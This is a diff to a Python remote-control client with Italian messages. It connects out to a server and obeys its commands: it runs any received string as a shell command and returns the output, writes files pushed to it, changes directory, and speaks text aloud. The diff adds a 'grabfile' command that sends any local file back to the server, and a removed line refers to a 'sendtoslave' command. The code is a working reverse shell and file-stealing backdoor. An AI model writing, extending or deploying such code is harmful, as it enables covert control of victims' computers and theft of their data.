@@ -6,24 +6,14 @@ from termcolor import cprint
 from helpers import BudaSocket, decode
 
 
-def run_command(command: str):
-    p = subprocess.run(command, shell=True, capture_output=True)
-    return p.stdout, p.stderr
-
-
-def speak(speech: str):
-    engine.say(speech)
-    engine.runAndWait()
-
-
-if __name__ == '__main__':
+def run():
     host = hlp.argv_or_default(1, '127.0.0.1')
     port = hlp.argv_or_default(2, 12345)
     
-    run_command('chcp 65001')
+    subprocess.run('chcp 65001', shell=True, capture_output=True)
 
     engine = pyttsx3.init()
-    engine.setProperty('rate', 125)
+    engine.setProperty('rate', 150)
 
     conn_loop = True
     while conn_loop:
@@ -33,45 +23,52 @@ if __name__ == '__main__':
                     client.send(os.getcwd())
                     data = client.recv()
 
-                    if data.startswith(b'<filename>'):
-                        file_name = data.removeprefix(b'<filename>').split(b'</filename>')[0]
-                        file_data = data.split(b'</filename>')[1]
-                        with open(file_name, 'wb') as file:
-                            file.write(file_data)
+                    if b'<END_OF_JSON_HEADER>' in data:
+                        hlp.tcp_to_file(data)
                         client.send('File mandato con successo\n')
-                    else:
-                        cmd = decode(data)
+                        continue
 
-                        if cmd == 'gn':
-                            cprint('Buonanotte', 'magenta')
-                            conn_loop = False
-                            break
-                        elif cmd.startswith('cd') and cmd != "cd":
-                            cmd = hlp.fix_white_spaces(cmd)
-                            try:
-                                os.chdir('..' if cmd == 'cd..' else cmd[3:])
-                                client.send('Directory cambiata\n')
-                            except FileNotFoundError:
-                                client.send('Directory non valida\n')
-                            continue
-                        elif cmd.startswith('speak'):
-                            try:
-                                speak(' '.join(cmd.split()[1:]))
-                                client.send('Comando "speak" eseguito correttamente\n')
-                            except IndexError:
-                                client.send('Parametri comando "speak" non validi\n')
-                            continue
-                        elif cmd.startswith('sendtoslave'):
-                            cmd_split = cmd.split()
+                    cmd = decode(data)
 
-                            if len(cmd_split) == 2:
-                                file_name = cmd_split[1].split('\\')[-1]
-                            elif len(cmd_split) == 3:
-                                file_name = cmd_split[2]
+                    if cmd == 'gn':
+                        cprint('Buonanotte', 'magenta')
+                        conn_loop = False
+                        break
+                    elif cmd.startswith('cd') and cmd != "cd":
+                        cmd = hlp.fix_white_spaces(cmd)
+                        try:
+                            os.chdir('..' if cmd == 'cd..' else cmd[3:])
+                            client.send('Directory cambiata\n')
+                        except FileNotFoundError:
+                            client.send('Directory non valida\n')
+                        continue
+                    elif cmd.startswith('speak'):
+                        try:
+                            engine.say(cmd.removeprefix('speak').lstrip())
+                            engine.runAndWait()
 
-                        output, error = run_command(cmd)
-                        client.send(output or error or ' ')
+                            client.send('Comando "speak" eseguito correttamente\n')
+                        except IndexError:
+                            client.send('Parametri comando "speak" non validi\n')
+                        continue
+                    elif cmd.startswith('grabfile'):
+                        if cmd == 'grabfile':
+                            client.send('Percorso file remoto mancante\n')
+                        else:
+                            path = cmd.removeprefix('grabfile').lstrip()
+                            if os.path.isfile(path):
+                                client.send_file(path)
+                            else:
+                                client.send('Percorso file remoto inesistente\n')
+                        continue
+
+                    p = subprocess.run(cmd, shell=True, capture_output=True)
+                    client.send(p.stdout or p.stderr or ' ')
             except ConnectionResetError:
                 hlp.print_error('Connessione resettata dal server', False)
             except ConnectionAbortedError:
                 hlp.print_error('Connessione annullata dal server', False)
+
+
+if __name__ == '__main__':
+    run()
